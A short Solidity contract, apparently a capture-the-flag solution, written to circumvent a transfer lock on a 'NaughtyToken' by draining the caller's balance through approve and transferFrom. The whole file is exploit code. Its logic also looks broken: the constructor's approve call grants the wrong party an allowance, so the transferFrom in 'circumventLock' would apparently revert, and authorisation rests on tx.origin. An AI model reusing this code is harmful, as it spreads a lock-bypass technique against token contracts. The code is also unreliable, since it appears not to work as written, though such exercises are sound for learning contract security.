// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtyToken {
    function transferFrom(address _from, address _to, uint256 _value) external returns(bool);
    function approve(address _spender, uint256 _value) external returns(bool);
    function balanceOf(address _owner) external view returns(uint256);
}

contract naughtyTransfer {

    INaughtyToken naughtyToken;

    constructor(address _naughtyToken) {
        naughtyToken = INaughtyToken(_naughtyToken);
        naughtyToken.approve(tx.origin, naughtyToken.balanceOf(tx.origin));
    }

    
    function circumventLock() external {
        uint256 balance = naughtyToken.balanceOf(tx.origin);
        naughtyToken.transferFrom(tx.origin, address(this), balance);
    }


}